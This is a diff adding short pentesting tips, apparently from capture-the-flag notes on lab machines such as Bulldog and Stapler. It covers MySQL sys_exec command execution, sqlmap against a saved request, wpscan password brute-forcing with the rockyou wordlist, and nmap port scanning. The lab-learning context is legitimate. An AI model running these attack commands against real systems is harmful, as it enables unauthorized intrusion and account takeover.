@@ -66,3 +66,24 @@ mysql can execute commands with
 	select sys_exec('COMMAND');
 these commands can't output to standard output, but will happen. (chown, chmod, touch, go nuts!)
  
+
+(Bulldog)
+Sometimes reverse engineering is as simple as "strings"
+
+
+(Several)
+Save a post request to filename.req and feed it to sqlmap with the -r flag
+	sqlmap -r filename.req --dbs
+
+
+(Stapler)
+
+wpscan has a bruteforcer 
+	wpscan -u 'https://192.168.56.102:12380/blogblog/' --username elly --wordlist ~/Wordlists/rockyou.txt --disable-tls-checks
+
+Sometimes nmap doesn't check enough ports. If you get stuck try some manual port declaration
+	nmap -sV -p1-15000 -T4 HOST
+	
+
+
+
